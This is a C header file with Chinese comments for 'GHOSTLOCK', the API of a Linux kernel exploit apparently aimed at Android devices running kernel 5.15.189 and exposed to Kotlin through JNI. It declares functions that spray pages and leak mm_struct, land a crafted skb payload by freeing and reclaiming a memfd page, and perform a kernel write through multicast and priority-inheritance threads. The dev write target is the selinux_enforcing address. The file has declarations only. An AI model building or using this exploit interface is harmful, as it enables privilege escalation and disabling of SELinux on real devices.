/**
 * @file api.h
 * @brief 43499 的普通 C 入口（JNI 与设备探针共用同一实现）。
 *
 * 目的：让 Kotlin（经 JNI）与设备探针（直接链接）走**同一条** native 路径，
 * 从而可以对拍"JNI 包装"与"直接调用"的读数是否一致。
 *
 * @note 句柄：当前实现是**单会话**（沿用 `g_exploit_session`），`create` 只做
 *       初始化与幂等检查，不做多实例。P3 会话对象落地后改为真句柄；在那之前
 *       同一进程只允许一次 `create`/`close`。
 * @note profile：`create` 目前装载**写死的 5.15.189 dev profile**（见
 *       `core/dev_profile.h`），因为 profile blob 契约尚未落地。生产接线前必须
 *       改为由调用方传入。
 * @note 阶段：P-A（JNI v0）过渡物；config blob + 真句柄落地后本文件的
 *       `create` 签名会变。
 */
#ifndef GHOSTLOCK_CORE_API_H
#define GHOSTLOCK_CORE_API_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief 初始化单会话（装载 dev profile、解析地址）。
 *
 * @return 0 成功；负数为 `-errno`（例如 `-EALREADY` 重复创建）。
 * @note 必须在后台线程调用一次，且与 `glk43499_api_close` 成对。
 */
int32_t glk43499_api_create(void);

/**
 * @brief 喷页 + 泄漏，返回 `mm_struct`。
 *
 * @param target 目标地址的 direct-map 别名（本次写要落到的位置）。
 * @return `mm_struct`；0 表示失败（`last_step`/`last_errno` 有原因）。
 * @note 与 `glk43499_api_land` 必须在同一次 `create` 会话内、且中间不得有其它写。
 */
uint64_t glk43499_api_discover(uint64_t target);

/**
 * @brief 用 `mm_struct` 落页：建载荷 → 关 memfd 释放 → reclaim。
 *
 * @param mm_struct `glk43499_api_discover` 的返回值。
 * @param target    与 `discover` 相同的目标地址。
 * @return 页基址；0 表示拒绝或失败。
 */
uint64_t glk43499_api_land(uint64_t mm_struct, uint64_t target);

/**
 * @brief 与 `glk43499_api_land` 相同，但发出去的页载荷由调用方给出。
 *
 * @param mm_struct     `discover` 的返回值。
 * @param target        与 `discover` 相同的目标地址。
 * @param skb_payload   全量页载荷（长度必须等于 native 的 `SKB_SEND_SIZE`）。
 * @param len           载荷长度。
 * @return 页基址；0 表示拒绝或失败。
 * @note 页几何（fake_* 与接受判据）仍由 native 解析；这里只覆盖要喷出去的字节。
 *       字节必须与 native 构造逐字节一致（host 向量即该判据）。
 */
uint64_t glk43499_api_land_with_payload(uint64_t mm_struct, uint64_t target,
                                        const uint8_t *skb_payload, size_t len);

/**
 * @brief select 物理入口（保留面占位）。
 *
 * @return `-ENOSYS`：该 route 尚无自有真机门禁，未证明前一律拒绝。
 */
int32_t glk43499_api_execute_select(uint64_t target);

/**
 * @brief tcp 物理入口（保留面占位）。
 *
 * @return `-ENOSYS`：同上。
 */
int32_t glk43499_api_execute_tcp(uint64_t target);

/**
 * @brief 一次完整的 W1 写（discover + land + PI 三线程 + multicast 单发）。
 *
 * @param target 目标地址的 direct-map 别名。
 * @return 1 写入成功；0 失败。
 */
int32_t glk43499_api_run_mcast(uint64_t target);

/**
 * @brief 执行一段已落页的 multicast 单发（不喷页，供 split 调用后使用）。
 *
 * @param target 目标地址（用于构造 route 输入）。
 * @return 1 成功；0 失败。
 */
int32_t glk43499_api_execute_mcast(uint64_t target);

/** @brief 页载荷要求的字节数（Kotlin 构造时用；来自 native 的 `SKB_SEND_SIZE`）。 */
size_t glk43499_api_skb_payload_size(void);

/** @brief dev 目标地址：`selinux_enforcing` 的 direct-map 别名（0 = 未初始化）。 */
uint64_t glk43499_api_selinux_target(void);

/** @brief 最近一次失败/成功的 route step（0 表示无失败）。 */
int32_t glk43499_api_last_step(void);

/** @brief 最近一次的 errno（0 表示无失败）。 */
int32_t glk43499_api_last_errno(void);

/** @brief 释放会话（幂等）。 */
void glk43499_api_close(void);

#ifdef __cplusplus
}
#endif

#endif // GHOSTLOCK_CORE_API_H
